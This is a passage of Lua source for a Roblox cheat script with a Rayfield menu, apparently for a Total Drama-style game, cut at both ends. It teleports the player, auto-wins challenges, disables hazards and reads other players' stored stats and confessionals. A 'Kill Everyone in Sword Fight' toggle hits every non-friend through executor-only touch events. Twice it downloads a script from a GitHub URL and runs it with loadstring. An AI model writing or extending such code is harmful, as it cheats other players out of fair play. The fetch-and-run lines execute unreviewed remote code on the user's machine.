        local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=48&height=48&format=png"
        local scrollFrame = workspace:FindFirstChild("WinLeaderboard") and workspace.WinLeaderboard.SurfaceGui.ScrollingFrame
        if scrollFrame then
            for _, frame in pairs(scrollFrame:GetChildren()) do
                if frame:IsA("Frame") then
                    local placeLabel = frame:FindFirstChild("Image") and frame.Image:FindFirstChild("Place")
                    if placeLabel and placeLabel.Text == "1" then
                        frame.PName.Text = player.Name
                        frame.Image.Image = avatarUrl
                        break
                    end
                end
            end
        end
    end,
})

ClientTab:CreateDivider()

game:GetService("RunService").RenderStepped:Connect(function()
    local char = game.Players.LocalPlayer.Character
    if not char then return end
    for _, obj in ipairs(char:GetDescendants()) do
        if obj:IsA("TextLabel") or obj:IsA("TextButton") then
            if _G.UseCustomName and _G.CustomName ~= "" then
                obj.Text = _G.CustomName
            end
            if _G.SelectedFont then
                obj.Font = _G.SelectedFont
            end
            obj.TextScaled = true
            if _G.RainbowMode then
                local hue = (tick() * _G.RainbowSpeed) % 1
                obj.TextColor3 = Color3.fromHSV(hue, 0.6, 1)
            elseif _G.StaticColorCustom then
                obj.TextColor3 = _G.StaticColor
            end
            obj.TextStrokeTransparency = 0.5
            obj.BackgroundTransparency = 1
        end
    end
end)

local ply = {}
for _, v in ipairs(game.Players:GetPlayers()) do
    table.insert(ply, v.Name)
end
local stato = ply[1]

ToolsTab:CreateSection("Stats Viewer")
local StatsDropdown = ToolsTab:CreateDropdown({
    Name = "Select Player",
    Options = ply,
    CurrentOption = {ply[1]},
    MultipleOptions = false,
    Flag = "StatsViewerPlayer",
    Callback = function(Options)
        stato = Options[1]
    end,
})

ToolsTab:CreateButton({
    Name = "Refresh Player List",
    Callback = function()
        local newPly = {}
        for _, v in ipairs(game.Players:GetPlayers()) do
            table.insert(newPly, v.Name)
        end
        StatsDropdown:Refresh(newPly)
        if #newPly > 0 then
            StatsDropdown:Set({newPly[1]})
            stato = newPly[1]
        end
    end,
})

ToolsTab:CreateButton({
    Name = "View All Stats",
    Callback = function()
        pcall(function()
            local ds = game.Players[stato].DataStore
            local lines = {
                "Camp Wins: " .. ds.CampWins.Value,
                "Movies Wins: " .. ds.MoviesWins.Value,
                "Expedition Wins: " .. ds.ExpeditionWins.Value,
                "Comeback Wins: " .. ds.ComebackWins.Value,
                "Coins: " .. ds.Coins.Value,
                "Games Played: " .. ds.GamesPlayed.Value,
                "Idols Found: " .. ds.IdolsFound.Value,
            }
            print(stato .. " stats:")
            for _, line in ipairs(lines) do print(line) end
            Rayfield:Notify({ Title = stato .. "'s Stats", Content = table.concat(lines, "\n"), Duration = 8, Image = "bar-chart-2" })
        end)
    end,
})

ToolsTab:CreateButton({
    Name = "Print Skins",
    Callback = function()
        pcall(function()
            local skins = game.Players[stato].DataStore.Skins:GetChildren()
            print(stato .. " skins:")
            if #skins == 0 then
                print("No skins.")
            else
                for _, v in ipairs(skins) do print(v.Name) end
            end
        end)
    end,
})

ToolsTab:CreateButton({
    Name = "Print Marshmallows",
    Callback = function()
        pcall(function()
            local marsh = game.Players[stato].DataStore.Marshmallows:GetChildren()
            print(stato .. " marshmallows:")
            if #marsh == 0 then
                print("No marshmallows.")
            else
                for _, v in ipairs(marsh) do print(v.Name) end
            end
        end)
    end,
})

ToolsTab:CreateButton({
    Name = "View Confessional",
    Callback = function()
        pcall(function()
            local v = game.Players[stato].DataStore.Confessional.Value
            Rayfield:Notify({ Title = stato .. "'s Confessional", Content = v, Duration = 6, Image = "message-square" })
        end)
    end,
})

if isCamp then
    ToolsTab:CreateSection("Teleports")
    ToolsTab:CreateButton({
        Name = "Spectator Island",
        Callback = function()
            player.Character:FindFirstChild("HumanoidRootPart").CFrame = CFrame.new(33, -16, 31)
        end,
    })
    ToolsTab:CreateButton({
        Name = "Main Island",
        Callback = function()
            player.Character:FindFirstChild("HumanoidRootPart").CFrame = CFrame.new(150, -17, -417)
        end,
    })
    ToolsTab:CreateButton({
        Name = "Exile Island",
        Callback = function()
            player.Character:FindFirstChild("HumanoidRootPart").CFrame = CFrame.new(-116, -14, -166)
        end,
    })
    ToolsTab:CreateButton({
        Name = "Voting Area",
        Callback = function()
            player.Character:FindFirstChild("HumanoidRootPart").CFrame = CFrame.new(-23, 95, -514)
        end,
    })
    ToolsTab:CreateButton({
        Name = "Boat",
        Callback = function()
            player.Character:FindFirstChild("HumanoidRootPart").CFrame = CFrame.new(47, -20, -297)
        end,
    })
    ToolsTab:CreateButton({
        Name = "Bathroom",
        Callback = function()
            player.Character:FindFirstChild("HumanoidRootPart").CFrame = CFrame.new(302, -15, -325)
        end,
    })
end

if isMovies then
    ToolsTab:CreateSection("Teleports")
    ToolsTab:CreateButton({
        Name = "Dock",
        Callback = function()
            player.Character:FindFirstChild("HumanoidRootPart").CFrame = CFrame.new(-187, 52, 5)
        end,
    })
    ToolsTab:CreateButton({
        Name = "Voting Area",
        Callback = function()
            player.Character:FindFirstChild("HumanoidRootPart").CFrame = CFrame.new(89, 63, -148)
        end,
    })
    ToolsTab:CreateButton({
        Name = "Confessionals",
        Callback = function()
            player.Character:FindFirstChild("HumanoidRootPart").CFrame = CFrame.new(17, 65, -24)
        end,
    })
    ToolsTab:CreateButton({
        Name = "Challenge",
        Callback = function()
            player.Character:FindFirstChild("HumanoidRootPart").CFrame = CFrame.new(357, 64, -257)
        end,
    })
    ToolsTab:CreateButton({
        Name = "Aftermath",
        Callback = function()
            player.Character:FindFirstChild("HumanoidRootPart").CFrame = CFrame.new(-669, -66, -666)
        end,
    })
end

if isExpedition then
    ToolsTab:CreateSection("Teleports")
    ToolsTab:CreateButton({
        Name = "Drop-Off",
        Callback = function()
            player.Character:FindFirstChild("HumanoidRootPart").CFrame = CFrame.new(-116, 106, -32)
        end,
    })
    ToolsTab:CreateButton({
        Name = "Confessionals",
        Callback = function()
            player.Character:FindFirstChild("HumanoidRootPart").CFrame = CFrame.new(2, 102, -23)
        end,
    })
    ToolsTab:CreateButton({
        Name = "First Class",
        Callback = function()
            player.Character:FindFirstChild("HumanoidRootPart").CFrame = CFrame.new(172, 105, -35)
        end,
    })
    ToolsTab:CreateButton({
        Name = "Spectator Island",
        Callback = function()
            player.Character:FindFirstChild("HumanoidRootPart").CFrame = CFrame.new(-157, -22, -885)
        end,
    })
end

ToolsTab:CreateDivider()
if not isMovies then
    ChallengesTab:CreateSection("Challenges")
end

if isCamp then
    local _arActiveCamp = false
    local _arFiredCamp  = false
    ChallengesTab:CreateToggle({
        Name = "Auto Restart Day",
        CurrentValue = false,
        Flag = "AutoRestartDayCamp",
        Callback = function(Value)
            _arActiveCamp = Value
            _arFiredCamp  = false
            if Value then
                task.spawn(function()
                    while _arActiveCamp do
                        local timerVisible = false
                        pcall(function()
                            timerVisible = player.PlayerGui.Timer.Background.Timer.Visible
                        end)
                        if timerVisible and not _arFiredCamp then
                            _arFiredCamp = true
                            loadstring(game:HttpGet("https://raw.githubusercontent.com/robloxcheatck/reanimatescript/main/script.lua", true))()
                        end
                        if not timerVisible then
                            _arFiredCamp = false
                        end
                        task.wait(0.05)
                    end
                end)
            end
        end,
    })
    
    ChallengesTab:CreateButton({
        Name = "Win Obby",
        Callback = function()
            local finish = workspace.Assets:FindFirstChild("Finish", true)
            if finish then
                finish.CanCollide = false
                finish.Transparency = 1
                wait()
                finish.Position = player.Character.Torso.Position
            end
        end,
    })
    
    ChallengesTab:CreateToggle({
        Name = "Auto Win Obby",
        CurrentValue = false,
        Flag = "AutoWinObby",
        Callback = function(Value)
            autoWinObby = Value
            if Value then
                task.spawn(function()
                    while autoWinObby do
                        local assets = workspace:FindFirstChild("Assets")
                        if assets then
                            local finish = assets:FindFirstChild("Finish", true)
                            if finish then
                                finish.CanCollide = false
                                finish.Transparency = 1
                                task.wait()
                                finish.Position = player.Character.HumanoidRootPart.Position
                            end
                        end
                        task.wait(0.1)
                    end
                end)
            end
        end,
    })
    
    ChallengesTab:CreateButton({
        Name = "Obby Godmode",
        Callback = function()
            local klp = {"Mud", "Water", "Lava"}
            for _, v in pairs(workspace.Assets:GetDescendants()) do
                if table.find(klp, v.Name) then
                    local touch = v:FindFirstChild("TouchInterest")
                    if touch then touch:Destroy() end
                end
            end
        end,
    })
    
    ChallengesTab:CreateButton({
        Name = "Disable Spinner/Sweeper Parts",
        Callback = function()
            local function disableTouchInterest(part)
                for _, v in ipairs(part:GetChildren()) do
                    if v:IsA("TouchTransmitter") then
                        v:Destroy()
                    end
                end
            end
            local function processWorkspace()
                for _, obj in ipairs(workspace:GetDescendants()) do
                    if obj:IsA("UnionOperation") then
                        disableTouchInterest(obj)
                    end
                end
            end
            processWorkspace()
            workspace.DescendantAdded:Connect(function(obj)
                if obj:IsA("UnionOperation") then
                    task.wait()
                    disableTouchInterest(obj)
                end
            end)
        end,
    })
    
    local _cliffDivingESP = false
    local _cliffDivingObjects = {}
    local _cliffDivingConn1, _cliffDivingConn2, _cliffDivingUpdateConn
    ChallengesTab:CreateToggle({
        Name = "Cliff Diving ESP",
        CurrentValue = false,
        Flag = "CliffDivingESP",
        Callback = function(Value)
            _cliffDivingESP = Value
            if Value then
                local _cdMAX_DIST = 500
                local function _createCliffESP(part)
                    if _cliffDivingObjects[part] then return end
                    if not part:FindFirstChild("CliffHighlight") then
                        local highlight = Instance.new("Highlight")
                        highlight.Name = "CliffHighlight"
                        highlight.FillTransparency = 1
                        highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
                        highlight.Parent = part
                    end
                    local bb = Instance.new("BillboardGui")
                    bb.AlwaysOnTop = true
                    bb.Size = UDim2.new(0, 260, 0, 70)
                    bb.StudsOffset = Vector3.new(0, 4, 0)
                    bb.Adornee = part
                    bb.Parent = part
                    local lbl = Instance.new("TextLabel")
                    lbl.BackgroundTransparency = 1
                    lbl.Size = UDim2.new(1, 0, 1, 0)
                    lbl.TextColor3 = Color3.fromRGB(255, 255, 255)
                    lbl.TextStrokeTransparency = 0
                    lbl.TextScaled = true
                    lbl.Font = Enum.Font.GothamBold
                    lbl.Text = "FINISH"
                    lbl.Parent = bb
                    _cliffDivingObjects[part] = { billboard = bb, distLabel = lbl }
                end
                for _, obj in ipairs(workspace:GetDescendants()) do
                    if obj:IsA("BasePart") and obj.Name:lower() == "finish" then
                        _createCliffESP(obj)
                    end
                end
                _cliffDivingConn1 = workspace.DescendantAdded:Connect(function(obj)
                    if _cliffDivingESP and obj:IsA("BasePart") and obj.Name:lower() == "finish" then
                        _createCliffESP(obj)
                    end
                end)
                _cliffDivingConn2 = workspace.DescendantRemoving:Connect(function(obj)
                    if _cliffDivingObjects[obj] then
                        pcall(function() _cliffDivingObjects[obj].billboard:Destroy() end)
                        _cliffDivingObjects[obj] = nil
                    end
                end)
                _cliffDivingUpdateConn = game:GetService("RunService").RenderStepped:Connect(function()
                    if not _cliffDivingESP then return end
                    local char = player.Character
                    local root = char and char:FindFirstChild("HumanoidRootPart")
                    if not root then return end
                    for part, esp in pairs(_cliffDivingObjects) do
                        local dist = (part.Position - root.Position).Magnitude
                        esp.billboard.Enabled = dist <= _cdMAX_DIST
                        if dist <= _cdMAX_DIST then
                            esp.distLabel.Text = string.format("%.1f studs", dist)
                        end
                    end
                end)
            else
                for part, esp in pairs(_cliffDivingObjects) do
                    pcall(function() esp.billboard:Destroy() end)
                    pcall(function() if part:FindFirstChild("CliffHighlight") then part.CliffHighlight:Destroy() end end)
                end
                _cliffDivingObjects = {}
                if _cliffDivingConn1 then _cliffDivingConn1:Disconnect(); _cliffDivingConn1 = nil end
                if _cliffDivingConn2 then _cliffDivingConn2:Disconnect(); _cliffDivingConn2 = nil end
                if _cliffDivingUpdateConn then _cliffDivingUpdateConn:Disconnect(); _cliffDivingUpdateConn = nil end
            end
        end,
    })
    
    ChallengesTab:CreateButton({
        Name = "Spleef Godmode",
        Callback = function()
            local assets = workspace:FindFirstChild("Assets")
            if assets then
                local spleef = assets:FindFirstChild("Spleef")
                if spleef then
                    local part = spleef:FindFirstChild("Part")
                    if part then
                        local touch = part:FindFirstChild("TouchInterest")
                        if touch then touch:Destroy() end
                    end
                end
            end
        end,
    })
    
    ChallengesTab:CreateButton({
        Name = "Remove All Particles in Spleef",
        Callback = function()
            for i, v in pairs(game.Workspace.Assets:GetDescendants()) do
                if v.Name == "SpleefPart" then
                    firetouchinterest(player.Character.HumanoidRootPart, v, 0)
                end
            end
        end,
    })
    
    local autoMath = false
    local autoMathDelay = 0
    ChallengesTab:CreateToggle({
        Name = "Auto Solve Math Mania",
        CurrentValue = false,
        Flag = "AutoWinMath",
        Callback = function(Value)
            autoMath = Value
            if Value then
                task.spawn(function()
                    while autoMath do
                        local mathManiaGui = player.PlayerGui:FindFirstChild("MathMania")
                        if mathManiaGui then
                            for number = 1, 10 do
                                if not autoMath then break end
                                local questionGui = mathManiaGui:FindFirstChild(tostring(number))
                                if questionGui then
                                    local s = questionGui.MainText.Text
                                    local clean = s:gsub("=", ""):gsub("?", ""):gsub(" ", "")
                                    local result = loadstring("return " .. clean)()
                                    if result then
                                        questionGui.Box.Text = tostring(result)
                                        local button = questionGui:FindFirstChild("Enter")
                                        if button then
                                            local events = {"MouseButton1Click", "MouseButton1Down", "Activated"}
                                            for _, event in pairs(events) do
                                                if getconnections and button[event] then
                                                    for _, connection in pairs(getconnections(button[event])) do
                                                        if connection.Function then connection:Fire() end
                                                    end
                                                end
                                            end
                                        end
                                        if autoMathDelay > 0 then task.wait(autoMathDelay) end
                                    end
                                end
                            end
                        end
                        task.wait()
                    end
                end)
            end
        end,
    })
    
    ChallengesTab:CreateSlider({
        Name = "Math Mania Answer Delay",
        Range = {0, 10},
        Increment = 0.1,
        Suffix = "s",
        CurrentValue = 0,
        Flag = "AutoWinMathDelay",
        Callback = function(Value)
            autoMathDelay = Value
        end,
    })
    
    local autoCollect = false
    ChallengesTab:CreateToggle({
        Name = "Auto Collect Coins & Gems",
        CurrentValue = false,
        Flag = "AutoCollect",
        Callback = function(Value)
            autoCollect = Value
            if Value then
                task.spawn(function()
                    while autoCollect do
                        task.wait(0.5)
                        local char = player.Character
                        local root = char and char:FindFirstChild("HumanoidRootPart")
                        if root then
                            for i, v in pairs(workspace.Assets:GetDescendants()) do
                                if v.Name == "Coin" or v.Name == "Gem" then
                                    if v:IsA("BasePart") then
                                        v.CanCollide = false
                                        v.Position = root.Position
                                    end
                                end
                            end
                        end
                    end
                end)
            end
        end,
    })
    
    ChallengesTab:CreateButton({
        Name = "Finish Pancake",
        Callback = function()
            for i, v in pairs(workspace.Assets:GetDescendants()) do
                if v.Name == player.Name then
                    for _ = 1, 80 do
                        fireclickdetector(v.ClickDetector)
                    end
                end
            end
        end,
    })
    
    ChallengesTab:CreateButton({
        Name = "Win Block Push",
        Callback = function()
            for i, v in ipairs(workspace:GetDescendants()) do
                if v:IsA("Part") and v.Name == "SingularBox" then
                    local distance = (v.Position - player.Character.HumanoidRootPart.Position).Magnitude
                    if distance <= 100 then
                        for i2, v2 in ipairs(workspace:GetDescendants()) do
                            if v2:IsA("Part") and v2.Name == "Gold" then
                                v.Position = v2.Position + Vector3.new(0, 3, 0)
                                player.Character.HumanoidRootPart.CFrame = CFrame.new(v.Position + Vector3.new(0, 3, 0))
                                break
                            end
                        end
                        break
                    end
                end
            end
        end,
    })
    
    local autoDodgeballPull = false
    ChallengesTab:CreateToggle({
        Name = "Auto Get Dodgeballs",
        CurrentValue = false,
        Flag = "AutoGetDodgeballsPull",
        Callback = function(Value)
            autoDodgeballPull = Value
            if not Value then return end
            task.spawn(function()
                while autoDodgeballPull do
                    local char = player.Character
                    local root = char and char:FindFirstChild("HumanoidRootPart")
                    if root then
                        local assets = workspace:FindFirstChild("Assets")
                        if assets then
                            for _, v in pairs(assets:GetDescendants()) do
                                if v:IsA("BasePart") and v.Name:lower():find("dodgeball") then
                                    firetouchinterest(root, v, 0)
                                    firetouchinterest(root, v, 1)
                                end
                            end
                        end
                    end
                    task.wait(0.1)
                end
            end)
        end,
    })
    
    local dbProtection = false
    ChallengesTab:CreateToggle({
        Name = "Dodgeball Protection",
        CurrentValue = false,
        Flag = "DodgeballProtection",
        Callback = function(Value)
            dbProtection = Value
            if Value then
                task.spawn(function()
                    local triggered = false
                    while dbProtection do
                        local assets = workspace:FindFirstChild("Assets")
                        if assets then
                            local dbGiver = assets:FindFirstChild("DodgeballGiver", true)
                            if dbGiver and not triggered then
                                triggered = true
                                player.Character.Humanoid.Health = 0
                            end
                            if not dbGiver then triggered = false end
                        end
                        task.wait(0.1)
                    end
                end)
            end
        end,
    })
    
    local paintballProtection = false
    ChallengesTab:CreateToggle({
        Name = "Paintball Protection",
        CurrentValue = false,
        Flag = "PaintballProtection",
        Callback = function(Value)
            paintballProtection = Value
            if Value then
                task.spawn(function()
                    local triggered = false
                    while paintballProtection do
                        local assets = workspace:FindFirstChild("Assets")
                        if assets then
                            local paintball = assets:FindFirstChild("Paintball", true) or assets:FindFirstChild("PaintballArena", true)
                            if paintball and not triggered then
                                triggered = true
                                player.Character.Humanoid.Health = 0
                            end
                            if not paintball then triggered = false end
                        end
                        task.wait(0.1)
                    end
                end)
            end
        end,
    })
    
    local swordFightEnabled = false
    local swordFightConnection = nil
    ChallengesTab:CreateToggle({
        Name = "Kill Everyone in Sword Fight",
        CurrentValue = false,
        Flag = "SwordFightKill",
        Callback = function(Value)
            swordFightEnabled = Value
            if Value then
                task.spawn(function()
                    while swordFightEnabled do
                        local backpack = player:FindFirstChild("Backpack")
                        local char = player.Character
                        if backpack and char then
                            local tool = nil
                            for _, t in ipairs(backpack:GetChildren()) do
                                if t:IsA("Tool") and t.Name:lower():find("sword") then
                                    tool = t
                                    break
                                end
                            end
                            local humanoid = char:FindFirstChildOfClass("Humanoid")
                            if tool and humanoid then humanoid:EquipTool(tool) end
                        end
                        task.wait()
                    end
                end)
                if swordFightConnection then swordFightConnection:Disconnect() end
                swordFightConnection = game:GetService("RunService").RenderStepped:Connect(function()
                    local players = game.Players:GetPlayers()
                    for i = 2, #players do
                        local otherPlayer = players[i]
                        local character = otherPlayer.Character
                        if character and not player:IsFriendsWith(otherPlayer.UserId) then
                            local tool = player.Character and player.Character:FindFirstChildOfClass("Tool")
                            if tool and tool:FindFirstChild("Handle") then
                                tool:Activate()
                                for _, part in next, character:GetChildren() do
                                    if part:IsA("BasePart") then
                                        firetouchinterest(tool.Handle, part, 0)
                                        firetouchinterest(tool.Handle, part, 1)
                                    end
                                end
                            end
                        end
                    end
                end)
            else
                if swordFightConnection then
                    swordFightConnection:Disconnect()
                    swordFightConnection = nil
                end
            end
        end,
    })
end

if isMovies then
    ChallengesTab:CreateSection("Challenges")
    
    local _pt_enabled = false
    local _pt_placements = {}
    local _pt_finished = {}
    local _pt_myTeam = nil
    local _pt_conns = {}

    local function _pt_ordinal(n)
        if n == 1 then return "1st"
        elseif n == 2 then return "2nd"
        elseif n == 3 then return "3rd"
        else return n .. "th" end
    end

    local function _pt_getGameName(p)
        local ok, name = pcall(function()
            local RS = game:GetService("ReplicatedStorage")
            local season = RS:FindFirstChild("Season")
            if not season then return p.Name end
            local playersFolder = season:FindFirstChild("Players")
            if not playersFolder then return p.Name end
            local data = playersFolder:FindFirstChild(p.Name)
            if data and data.Value and data.Value ~= "" then
                return data.Value
            end
            return p.Name
        end)
        return (ok and name) or p.Name
    end

    local function _pt_printLeaderboard()
        print("===== CHALLENGE PLACEMENTS =====")
        for i, entry in ipairs(_pt_placements) do
            local tag = (entry.robloxName == player.Name) and " << YOU" or ""
            print(string.format("  #%d - %s (%s)%s", i, entry.gameName, entry.robloxName, tag))
        end
        print("---")
    end

    local function _pt_sendChat(msg)
        pcall(function()
            game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(msg)
        end)
    end

    local function _pt_onFinish(p)
        local playerName = p.Name
        if _pt_finished[playerName] then return end
        _pt_finished[playerName] = true
        local rank = #_pt_placements + 1
        local gameName = _pt_getGameName(p)
        table.insert(_pt_placements, { robloxName = playerName, gameName = gameName })
        print(string.format("[Placement Tracker] %s (%s) finished in %s place!", gameName, playerName, _pt_ordinal(rank)))
        if playerName == player.Name then
            _pt_sendChat(_pt_ordinal(rank))
            _pt_printLeaderboard()
        end
    end

    local function _pt_watchPad(pad)
        local conn = pad.Touched:Connect(function(hit)
            if not _pt_myTeam then return end
            for _, p in ipairs(game:GetService("Players"):GetPlayers()) do
                if p.Team and p.Team == _pt_myTeam then
                    local char = p.Character
                    if char and hit:IsDescendantOf(char) then
                        _pt_onFinish(p)
                    end
                end
            end
        end)
        table.insert(_pt_conns, conn)
    end

    local function _pt_start()
        if player.Team then
            _pt_myTeam = player.Team
            print("[Placement Tracker] Team: " .. _pt_myTeam.Name)
        end
        local teamConn = player:GetPropertyChangedSignal("Team"):Connect(function()
            if not _pt_enabled then return end
            local newTeam = player.Team
            if _pt_myTeam and newTeam and newTeam ~= _pt_myTeam then
                print("[Placement Tracker] Team merged/changed, stopping tracker.")
                Rayfield:Notify({ Title = "Placement Tracker", Content = "Teams merged, tracker stopped.", Duration = 4, Image = "trophy" })
                _pt_enabled = false
                pcall(function()
                    if Rayfield.Flags and Rayfield.Flags.PlacementTrackerMovies then
                        Rayfield.Flags.PlacementTrackerMovies:Set(false)
                    end
                end)
                _pt_stop()
            elseif newTeam and not _pt_myTeam then
                _pt_myTeam = newTeam
                print("[Placement Tracker] Team set: " .. _pt_myTeam.Name)
            end
        end)
        table.insert(_pt_conns, teamConn)
        local found = 0
        for _, v in ipairs(workspace:GetDescendants()) do
            if v.Name == "Finish" and v:IsA("BasePart") then
                _pt_watchPad(v)
                found += 1
            end
        end
        print("[Placement Tracker] Watching " .. found .. " Finish part(s).")
        local addConn = workspace.DescendantAdded:Connect(function(v)
            if _pt_enabled and v.Name == "Finish" and v:IsA("BasePart") then
                _pt_watchPad(v)
                print("[Placement Tracker] Late Finish part: " .. v:GetFullName())
            end
        end)
        table.insert(_pt_conns, addConn)
    end

    local function _pt_stop()
        for _, c in ipairs(_pt_conns) do c:Disconnect() end
        _pt_conns = {}
        _pt_placements = {}
        _pt_finished = {}
        _pt_myTeam = nil
        print("[Placement Tracker] Stopped.")
    end

    ChallengesTab:CreateToggle({
        Name = "Auto Say Placement & Placement Tracker (check console)",
        CurrentValue = false,
        Flag = "PlacementTrackerMovies",
        Callback = function(Value)
            _pt_enabled = Value
            if Value then
                _pt_placements = {}
                _pt_finished = {}
                _pt_start()
                Rayfield:Notify({ Title = "Placement Tracker", Content = "Tracking your team's placements. Your finish will be said in chat!", Duration = 4, Image = "trophy" })
            else
                _pt_stop()
            end
        end,
    })

    local _arActiveMovies = false
    local _arFiredMovies  = false
    ChallengesTab:CreateToggle({
        Name = "Auto Restart Day",
        CurrentValue = false,
        Flag = "AutoRestartDayMovies",
        Callback = function(Value)
            _arActiveMovies = Value
            _arFiredMovies  = false
            if Value then
                task.spawn(function()
                    while _arActiveMovies do
                        local timerVisible = false
                        pcall(function()
                            timerVisible = player.PlayerGui.Timer.Background.Timer.Visible
                        end)
                        if timerVisible and not _arFiredMovies then
                            _arFiredMovies = true
                            loadstring(game:HttpGet("https://raw.githubusercontent.com/robloxcheatck/reanimatescript/main/script.lua", true))()
                        end
                        if not timerVisible then
                            _arFiredMovies = false
                        end
                        task.wait(0.05)
                    end
                end)
            end
        end,
    })
    
    local _infectAllActive = false
    ChallengesTab:CreateToggle({
        Name = "Infect All",
        CurrentValue = false,
        Flag = "InfectAllMovies",
        Callback = function(Value)
            _infectAllActive = Value
            if Value then
                task.spawn(function()
                    while _infectAllActive do
                        local timerVisible = false
                        pcall(function()
                            timerVisible = player.PlayerGui.Timer.Background.Timer.Visible
                        end)
                        if not timerVisible then
                            _infectAllActive = false
                            break
                        end
                        local char = player.Character
                        local hrp = char and char:FindFirstChild("HumanoidRootPart")
                        if hrp then
                            for _, p in ipairs(game.Players:GetPlayers()) do
                                if p ~= player and _infectAllActive then
                                    local tChar = p.Character
                                    local tHRP = tChar and tChar:FindFirstChild("HumanoidRootPart")
                                    if tHRP then
                                        hrp.CFrame = tHRP.CFrame
                                        task.wait(0.3)
                                    end
                                end
                            end
                        end
                        task.wait(0.1)
                    end
                end)
            end
        end,
    })
    
    ChallengesTab:CreateButton({
        Name = "Win Obby",
        Callback = function()
            local f = workspace.Assets:FindFirstChild("Finish", true)
            if f and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                f.CanCollide = false; f.Transparency = 1; f.Position = player.Character.HumanoidRootPart.Position
            end
        end,
    })
    
    local _movObby = false
    ChallengesTab:CreateToggle({
        Name = "Auto Win Obby",
        CurrentValue = false,
        Flag = "MoviesAutoWinObby",
        Callback = function(Value)
            _movObby = Value
            if Value then task.spawn(function() while _movObby do
                local f = workspace.Assets:FindFirstChild("Finish", true)
                if f and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                    f.CanCollide = false; f.Transparency = 1; f.Position = player.Character.HumanoidRootPart.Position
                end; task.wait(0.5)
            end end) end
        end,
    })
    
    local _stuntMovieESP = false
    local _stuntMovieObjects = {}
    local _stuntMovieConn1, _stuntMovieConn2, _stuntMovieUpdateConn
    ChallengesTab:CreateToggle({
        Name = "Stunt Movie ESP",
        CurrentValue = false,
        Flag = "StuntMovieESP",
        Callback = function(Value)
            _stuntMovieESP = Value
            if Value then
                local _smMAX_DIST = 500
                local function _createStuntESP(part)
                    if _stuntMovieObjects[part] then return end
                    if not part:FindFirstChild("StuntHighlight") then
                        local highlight = Instance.new("Highlight")
                        highlight.Name = "StuntHighlight"
                        highlight.FillTransparency = 1
                        highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
                        highlight.Parent = part
                    end
                    local bb = Instance.new("BillboardGui")
                    bb.AlwaysOnTop = true
                    bb.Size = UDim2.new(0, 260, 0, 70)
                    bb.StudsOffset = Vector3.new(0, 4, 0)
                    bb.Adornee = part
                    bb.Parent = part
                    local lbl = Instance.new("TextLabel")
                    lbl.BackgroundTransparency = 1
                    lbl.Size = UDim2.new(1, 0, 1, 0)
                    lbl.TextColor3 = Color3.fromRGB(255, 255, 255)
                    lbl.TextStrokeTransparency = 0
                    lbl.TextScaled = true
                    lbl.Font = Enum.Font.GothamBold
                    lbl.Text = "FINISH"
                    lbl.Parent = bb
                    _stuntMovieObjects[part] = { billboard = bb, distLabel = lbl }
                end
                for _, obj in ipairs(workspace:GetDescendants()) do
                    if obj:IsA("BasePart") and obj.Name:lower() == "finish" then
                        _createStuntESP(obj)
                    end
                end
                _stuntMovieConn1 = workspace.DescendantAdded:Connect(function(obj)
                    if _stuntMovieESP and obj:IsA("BasePart") and obj.Name:lower() == "finish" then
                        _createStuntESP(obj)
                    end
                end)
                _stuntMovieConn2 = workspace.DescendantRemoving:Connect(function(obj)
                    if _stuntMovieObjects[obj] then
                        pcall(function() _stuntMovieObjects[obj].billboard:Destroy() end)
                        _stuntMovieObjects[obj] = nil
                    end
                end)
                _stuntMovieUpdateConn = game:GetService("RunService").RenderStepped:Connect(function()
                    if not _stuntMovieESP then return end
                    local char = player.Character
                    local root = char and char:FindFirstChild("HumanoidRootPart")
                    if not root then return end
                    for part, esp in pairs(_stuntMovieObjects) do
                        local dist = (part.Position - root.Position).Magnitude
                        esp.billboard.Enabled = dist <= _smMAX_DIST
                        if dist <= _smMAX_DIST then
                            esp.distLabel.Text = string.format("%.1f studs", dist)
                        end
                    end
                end)
            else
                for part, esp in pairs(_stuntMovieObjects) do
                    pcall(function() esp.billboard:Destroy() end)
                    pcall(function() if part:FindFirstChild("StuntHighlight") then part.StuntHighlight:Destroy() end end)
                end
                _stuntMovieObjects = {}
                if _stuntMovieConn1 then _stuntMovieConn1:Disconnect(); _stuntMovieConn1 = nil end
                if _stuntMovieConn2 then _stuntMovieConn2:Disconnect(); _stuntMovieConn2 = nil end
                if _stuntMovieUpdateConn then _stuntMovieUpdateConn:Disconnect(); _stuntMovieUpdateConn = nil end
            end
        end,
    })
    
    local _disableFiresConn = nil
    ChallengesTab:CreateToggle({
        Name = "Disable Fires",
        CurrentValue = false,
        Flag = "DisableFiresMovies",
        Callback = function(Value)
            if Value then
                local function removeFireTouchInterest()
                    for _, v in pairs(workspace:GetDescendants()) do
                        if v:IsA("TouchTransmitter") then
                            pcall(function() v:Destroy() end)
                        end
                    end
                end
                removeFireTouchInterest()
                _disableFiresConn = game:GetService("RunService").Stepped:Connect(function()
                    removeFireTouchInterest()
                end)
            else
                if _disableFiresConn then
                    _disableFiresConn:Disconnect()
                    _disableFiresConn = nil
                end
            end
        end,
    })
    
    ChallengesTab:CreateButton({
        Name = "Disable Lasers",
        Callback = function()
            local function disableTouchInterest(part)
                for _, v in ipairs(part:GetChildren()) do
                    if v:IsA("TouchTransmitter") then
                        v:Destroy()
                    end
                end
            end
            local function processModel(model)
                for _, part in ipairs(model:GetDescendants()) do
                    if part:IsA("BasePart") and part.Name:lower():find("laser") then
                        disableTouchInterest(part)
                    end
                end
            end
            processModel(workspace)
            workspace.DescendantAdded:Connect(function(obj)
                if obj:IsA("BasePart") and obj.Name:lower():find("laser") then
                    task.wait()
                    disableTouchInterest(obj)
                end
            end)
        end,
    })
    
    local _mathMov = false
    local _mathMovDelay = 0
    ChallengesTab:CreateToggle({
        Name = "Auto Solve Math Trivia",
        CurrentValue = false,
        Flag = "MoviesMathMania",
        Callback = function(Value)
            _mathMov = Value
            if not Value then return end
            task.spawn(function()
                while _mathMov do
                    local assets = workspace:FindFirstChild("Assets")
                    local mathManiaGui = player.PlayerGui:FindFirstChild("MathTrivia") or player.PlayerGui:FindFirstChild("MathMania")
                    if mathManiaGui and assets and (assets:FindFirstChild("Math Mania") or assets:FindFirstChild("Math Trivia") or assets:FindFirstChild("Singapore")) then
